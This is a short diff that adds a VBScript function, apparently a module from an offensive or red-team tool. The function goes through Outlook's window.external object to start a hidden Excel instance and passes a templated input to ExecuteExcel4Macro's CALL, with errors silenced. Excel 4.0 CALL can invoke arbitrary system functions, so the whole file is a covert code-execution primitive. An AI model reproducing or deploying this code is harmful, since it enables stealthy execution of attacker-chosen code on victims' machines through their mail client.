@@ -1,0 +1,7 @@
+Function execute_excel4macro()
+    On Error Resume Next
+    Set excel = window.external.OutlookApplication.CreateObject("Excel.Application")
+    excel.Visible = false
+    return_data = excel.ExecuteExcel4Macro("CALL({{input}})")
+    execute_excel4macro = "Data returned: " & return_data
+End Function
